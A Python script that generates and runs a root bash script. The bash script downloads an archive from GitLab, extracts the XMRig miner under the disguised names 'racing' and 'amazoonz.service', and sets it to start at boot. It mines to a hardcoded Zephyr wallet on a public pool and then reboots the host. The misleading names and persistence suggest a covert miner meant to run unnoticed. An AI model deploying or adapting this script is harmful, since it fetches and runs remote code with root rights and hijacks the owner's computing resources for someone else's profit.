#!/usr/bin/env python3
import argparse
import subprocess

def create_and_run_bash_script(worker, threads):
    script_content = f"""#!/bin/bash
cd /usr/local/bin
sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
sudo apt update
sudo systemctl stop amazoon.service
sudo systemctl disable amazoon.service
sudo tar xvzf amazonpython.tar.gz
# Kiểm tra và xóa thư mục 'racing' nếu nó đã tồn tại
if [ -d "racing" ]; then
    sudo rm -rf racing
fi
sudo mv xmrig-6.20.0 racing
# Tạo service file
service_file='/etc/systemd/system/amazoonz.service'
sudo bash -c 'echo -e "[Unit]\\nDescription=Amazoonz\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o us.zephyr.herominers.com:1123 -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p {worker} -a rx/0 -k -t {threads}\\n\\n[Install]\\nWantedBy=multi-user.target' > $service_file
# Unmask và enable service
sudo systemctl unmask amazoonz.service
sudo systemctl daemon-reload
sudo systemctl enable amazoonz.service
echo "Setup completed!"
sudo reboot
"""

    with open("setup.sh", "w") as file:
        file.write(script_content)
    
    subprocess.run(["bash", "setup.sh"], check=True)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Setup script for mining")
    parser.add_argument("--worker", required=True, help="Worker name")
    parser.add_argument("--threads", required=True, help="Number of threads")
    args = parser.parse_args()

    create_and_run_bash_script(args.worker, args.threads)
